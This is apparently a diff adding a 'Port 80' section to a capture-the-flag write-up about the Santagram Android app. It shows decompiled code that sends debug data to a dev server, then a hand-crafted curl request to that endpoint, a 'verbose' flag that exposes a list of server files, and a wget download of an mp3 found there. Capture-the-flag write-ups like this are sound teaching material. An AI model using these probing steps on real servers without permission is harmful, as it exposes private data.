@@ -1020,6 +1020,49 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
 ```
 
+### Port 80
+
+In the `strings.xml` file, the following constant is defined.
+
+```xml
+<string name="debug_data_collection_url">http://dev.northpolewonderland.com/index.php</string>
+<string name="debug_data_enabled">false</string>
+```
+
+The name `debug_data_collection_url` is only used once inside the app in the class `com.northpolewonderland.santagram.EditProfile`.
+
+```java
+if (z) {
+		try {
+				final JSONObject jSONObject = new JSONObject();
+				jSONObject.put("date", new SimpleDateFormat("yyyyMMddHHmmssZ").format(Calendar.getInstance().getTime()));
+				                                             20160225151944-0800
+				jSONObject.put("udid", Secure.getString(getContentResolver(), "android_id"));
+				jSONObject.put("debug", getClass().getCanonicalName() + ", " + getClass().getSimpleName());
+				jSONObject.put("freemem", Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory());
+				new Thread(new Runnable(this) {
+						final /* synthetic */ EditProfile b;
+
+						public void run() {
+								b.a(this.b.getString(R.string.debug_data_collection_url), jSONObject);
+						}
+				}).start();
+		} catch (Exception e) {
+				Log.e(getString(R.string.TAG), "Error posting JSON debug data: " + e.getMessage());
+		}
+}
+```
+
+With this information, we can built the JSON object on our own and use it with cURL. This gave me way more trouble then I expected. The reason is that there must be a valid canonical and short class names for the value `debug`, you cannot just make some names up. All the other entries are irrelevant.
+
+```
+curl -H "Content-Type: application/json" 'http://dev.northpolewonderland.com/index.php' -d '{"date":"2","udid":"2","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":1}'
+
+{"date":"20170105205633","status":"OK","filename":"debug-20170105205633-0.txt","request":{"date":"2","udid":"2","debug":"com.northpolewonderland.santagram.EditProfile, EditProfile","freemem":1,"verbose":false}}%
+```
+
+Note that there is an additional parameter in the response `"verbose":false`. We can set this to `true` in our request. In my case, the response was pretty big. Examining the first lines, I noticed that it seems to include a list of debug files stored on the server. Including an `mp3`file `debug-20161224235959-0.mp3`. We can download the file with `wget http://dev.northpolewonderland.com/debug-20161224235959-0.mp3`. I was not sure what number it should get, though. Will deal with this later.
+
 > dungeon.northpolewonderland.com 35.184.47.139
 
 ```
